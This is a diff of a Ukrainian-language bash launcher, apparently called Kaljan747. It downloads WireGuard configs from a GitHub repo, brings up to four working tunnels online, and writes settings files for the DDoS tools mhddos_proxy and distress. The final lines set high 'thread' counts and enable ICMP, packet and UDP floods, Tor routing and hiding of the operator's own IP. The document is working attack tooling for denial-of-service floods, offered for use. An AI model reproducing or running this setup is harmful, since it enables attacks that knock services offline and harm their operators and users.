@@ -4,7 +4,7 @@ set -e
 
 SETTINGS_FILE="$HOME/.kaljan747_settings"
 
-# === Функція запиту USER-ID ===
+# === Функції для запиту ===
 ask_user_id() {
     if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
         USER_ID=$(zenity --entry --title="Введення USER-ID" --text="Введіть ваш user-id (тільки цифри):" --width=400)
@@ -13,7 +13,6 @@ ask_user_id() {
     fi
 }
 
-# === Функція запиту параметрів запуску ===
 ask_run_parameters() {
     if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
         USER_SELECTION=$(zenity --forms --title="Kaljan747 Конфігурація" \
@@ -50,7 +49,7 @@ ask_run_parameters() {
     fi
 }
 
-# === Завантаження або запит налаштувань ===
+# === Завантаження/запит налаштувань ===
 if [ -f "$SETTINGS_FILE" ]; then
     if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
         zenity --question --title="Налаштування" --text="Використати збережені налаштування?" --ok-label="Так" --cancel-label="Ні"
@@ -60,11 +59,7 @@ if [ -f "$SETTINGS_FILE" ]; then
         echo "1) Використати старі"
         echo "2) Ввести нові"
         read -p "Ваш вибір (1/2): " choice
-        if [ "$choice" = "1" ]; then
-            USE_OLD=0
-        else
-            USE_OLD=1
-        fi
+        USE_OLD=$((choice-1))
     fi
 
     if [ "$USE_OLD" -eq 0 ]; then
@@ -87,11 +82,7 @@ if [ -z "$USER_ID" ]; then
         if [[ "$USER_ID" =~ ^[0-9]+$ ]]; then
             break
         else
-            if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
-                zenity --error --text="Помилка: USER-ID має містити тільки цифри!" --width=400
-            else
-                echo "Помилка: USER-ID має містити тільки цифри!"
-            fi
+            echo "Помилка: USER-ID має містити тільки цифри!"
         fi
     done
 fi
@@ -100,7 +91,6 @@ if [ -z "$SELECTED_MODULE" ] || [ -z "$EDIT_INI" ] || [ -z "$SELECTED_RUN_MODE" 
     ask_run_parameters
 fi
 
-# === Збереження налаштувань у файл ===
 cat > "$SETTINGS_FILE" <<EOF
 USER_ID="$USER_ID"
 SELECTED_MODULE="$SELECTED_MODULE"
@@ -108,7 +98,7 @@ EDIT_INI="$EDIT_INI"
 SELECTED_RUN_MODE="$SELECTED_RUN_MODE"
 EOF
 
-# === Перевірка прав користувача ===
+# === Перевірка sudo ===
 if [ "$(id -u)" -eq 0 ]; then
     SUDO=""
 else
@@ -120,28 +110,22 @@ else
     fi
 fi
 
-# === Встановлення необхідних пакетів ===
+# === Встановлення залежностей ===
 if command -v apt >/dev/null 2>&1; then
     $SUDO apt update -y
     $SUDO apt install -y curl wget git screen sed wireguard zenity
-elif command -v dnf >/dev/null 2>&1; then
-    $SUDO dnf install -y curl wget git screen sed wireguard-tools zenity
-elif command -v yum >/dev/null 2>&1; then
-    $SUDO yum install -y curl wget git screen sed wireguard-tools zenity
-elif command -v apk >/dev/null 2>&1; then
-    $SUDO apk add curl wget git screen sed wireguard-tools zenity
 else
     echo "Підтримуваний пакетний менеджер не знайдено."
     exit 1
 fi
 
-# === Підготовка директорій ===
+# === Підготовка папок ===
 MODULE_DIR="$HOME/modules"
 WG_DIR="$HOME/wg_confs"
 mkdir -p "$MODULE_DIR" "$WG_DIR"
 touch "$MODULE_DIR/mhddos.ini" "$MODULE_DIR/distress.ini"
 
-# === Вибір модуля ===
+# === Завантаження модулів ===
 case "$SELECTED_MODULE" in
     mhddos_proxy)
         MODULE="$MODULE_DIR/mhddos_proxy"
@@ -163,7 +147,7 @@ chmod +x "$MODULE"
 # === Завантаження WG-конфігів ===
 WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
 WG_RAW_BASE="https://raw.githubusercontent.com/k7771/Kaljan747/k7771/wg"
-CONF_LIST=$(curl -fsSL "$WG_REPO_HTML" | grep -oP '(?<=href=").*?\.conf(?=")' | grep '/k7771/Kaljan747/blob/' | sed -e 's|^/|https://github.com/|' -e 's|blob/|raw/|')
+CONF_LIST=$(curl -fsSL "$WG_REPO_HTML" | grep -oP '(?<=href=").*?\\.conf(?=")' | grep '/k7771/Kaljan747/blob/' | sed -e 's|^/|https://github.com/|' -e 's|blob/|raw/|')
 
 for url in $CONF_LIST; do
     file=$(basename "$url")
@@ -172,26 +156,47 @@ done
 
 $SUDO chmod 600 "$WG_DIR"/*.conf 2>/dev/null || true
 
-# === Зупинка активних WG ===
+# === Перевірка WG тунелів ===
+check_wg_connection() {
+    curl -s --interface "$1" --max-time 5 https://api.ipify.org >/dev/null 2>&1
+}
+
+# Зупинка всіх інтерфейсів
 for iface in $(wg show interfaces 2>/dev/null); do
     $SUDO wg-quick down "$iface" || true
     $SUDO ip link delete "$iface" || true
 done
 
-# === Підключення нових WG ===
-WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf | head -n 10))
+# Підключення 4 робочих тунелів
+WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf))
 WG_IFACES=()
+
 for conf in "${WG_FILES[@]}"; do
     IFACE_NAME=$(basename "$conf" .conf)
-    $SUDO wg-quick up "$conf"
-    WG_IFACES+=("$IFACE_NAME")
-    sleep 1
+    $SUDO wg-quick up "$conf" 2>/dev/null
+    sleep 2
+    if check_wg_connection "$IFACE_NAME"; then
+        echo "[+] Інтерфейс $IFACE_NAME працює."
+        WG_IFACES+=("$IFACE_NAME")
+    else
+        echo "[-] Інтерфейс $IFACE_NAME не працює. Видаляю."
+        $SUDO wg-quick down "$IFACE_NAME" 2>/dev/null
+        $SUDO ip link delete "$IFACE_NAME" 2>/dev/null || true
+    fi
+    if [ "${#WG_IFACES[@]}" -ge 4 ]; then
+        break
+    fi
 done
+
+if [ "${#WG_IFACES[@]}" -eq 0 ]; then
+    echo "[-] Не знайдено робочих WG тунелів. Завершення."
+    exit 1
+fi
 
 VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
 VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")
 
-# === Оновлення ini файлів ===
+# === Оновлення INI файлів ===
 echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces $VPN_LIST --user-id=$USER_ID" > "$MODULE_DIR/mhddos.ini"
 echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=$USER_ID" > "$MODULE_DIR/distress.ini"
 
